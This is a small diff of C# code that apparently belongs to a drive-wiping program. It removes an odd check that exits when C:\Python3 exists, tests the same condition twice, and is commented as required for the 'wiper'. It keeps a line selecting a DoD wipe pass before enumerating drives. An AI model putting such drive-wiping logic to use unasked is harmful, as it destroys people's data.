@@ -66,18 +66,7 @@ namespace Main
         }
         public static void Start()
         {
-            try //Checks if Python is installed - Required for wiper to function properly. Will change later.
-            {
-                if (Directory.Exists(@"C:\Python3")) 
-                {
-                    Environment.Exit(0);
-                }
-                else if (Directory.Exists(@"C:\Python3"))
-                {
-                    Environment.Exit(0);
-                }
-
-                    WipePass WipePass = WipePass.Dod;
+                WipePass WipePass = WipePass.Dod;
 
 
                 List<string> Drives;
